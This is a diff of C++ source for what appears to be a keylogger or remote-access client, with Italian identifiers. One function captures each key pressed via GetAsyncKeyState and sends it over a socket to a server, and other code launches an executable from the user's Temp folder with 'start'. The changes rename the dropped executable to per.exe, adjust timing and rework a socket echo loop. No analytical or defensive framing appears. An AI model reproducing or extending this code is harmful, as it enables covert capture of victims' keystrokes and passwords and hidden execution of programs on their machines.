@@ -238,7 +238,7 @@ void ricevi(SOCKET s)
 			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client reset."<<endl;
-				system("start pipo.exe");//3RIF
+				system("start per.exe");//3RIF
 				closesocket(s);
 				v=-1;
 				return;
@@ -338,7 +338,7 @@ void ricevi(SOCKET s)
 						if(GetAsyncKeyState(i)!=0)
 						{
 							send(s,&i,sizeof(i),0);
-							Sleep(52);
+							Sleep(55);
 							if(v6==false)
 								break;
 						}
@@ -636,12 +636,15 @@ void Lag()
 
 void LiveKey(SOCKET s)
 {
-	char LVK[2];
+	char LVK=0;
 	while(v6)
 	{
-		recv(s,LVK,sizeof(LVK),0);
-		//if(LVK=='V')
-		v6=false;
+		recv(s,&LVK,sizeof(LVK),0);
+		if(LVK=='~')
+			v6=false;
+		Sleep(1000);
+		send(s,&LVK,sizeof(LVK),0);
+		
 	}
 	return;
 }
@@ -669,7 +672,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'\0'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\prova.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\per.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFN[256]={'\0'};
 	char cmd[256]="start ";
